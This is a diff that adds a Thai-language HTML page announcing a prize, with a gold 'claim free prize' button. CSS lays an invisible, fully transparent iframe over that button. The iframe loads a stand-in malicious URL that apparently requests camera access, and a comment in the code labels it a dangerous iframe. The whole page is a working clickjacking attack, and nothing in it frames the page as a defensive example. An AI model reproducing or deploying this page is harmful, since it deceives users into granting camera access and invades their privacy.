@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>คุณได้รับรางวัล!</title>
+    <style>
+        body {
+            text-align: center;
+            margin: 100px;
+        }
+
+        button {
+            font-size: 20px;
+            padding: 15px 30px;
+            background-color: gold;
+            border: none;
+            cursor: pointer;
+        }
+
+        /* ซ่อน iframe และซ้อนทับให้ตรงปุ่ม */
+        #hiddenFrame {
+            position: absolute;
+            top: 120px; /* ปรับตำแหน่งให้ตรงกับปุ่ม */
+            left: 50%;
+            transform: translateX(-50%);
+            width: 200px;
+            height: 50px;
+            opacity: 0;
+            z-index: 999;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎉 ยินดีด้วย! คุณได้รับรางวัล 🎉</h1>
+    <button id="fakeButton">กดรับรางวัลฟรี!</button>
+
+    <!-- โหลด iframe อันตราย -->
+    <iframe id="hiddenFrame" src="https://malicious-site.com/request-camera" frameborder="0"></iframe>
+</body>
+</html>
